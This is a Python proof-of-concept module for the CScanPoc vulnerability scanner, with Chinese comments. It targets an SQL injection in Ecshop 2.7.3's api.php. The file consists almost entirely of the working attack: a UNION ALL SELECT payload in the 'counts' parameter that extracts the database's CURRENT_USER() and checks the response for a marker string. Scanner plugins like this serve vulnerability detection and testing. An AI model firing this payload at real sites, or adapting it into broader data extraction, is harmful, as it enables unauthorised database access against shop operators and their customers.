# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import re
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0002'  # 平台漏洞编号，留空
    name = 'Ecshop 2.7.3 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-20'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7b5d5f92-1337-4e9e-9f2c-28f9878f1874'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target + '/api.php'
            canshu = {'return_data': 'json',
                      'ac': '1',
                      'act': 'search_goods_list',
                      'api_version': '1.0',
                      'last_modify_st_time': '1',
                      'last_modify_en_time': '1',
                      'pages': '1',
                      'counts': '1 UNION ALL SELECT NULL,CONCAT(0x666630303030,IFNULL(CAST(CURRENT_USER()AS CHAR),0x20),0x20)#'}
            data = urllib.parse.urlencode(canshu)
            req = urllib.request.urlopen(verify_url, data)
            content = req.read()
            if 'ff0000' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
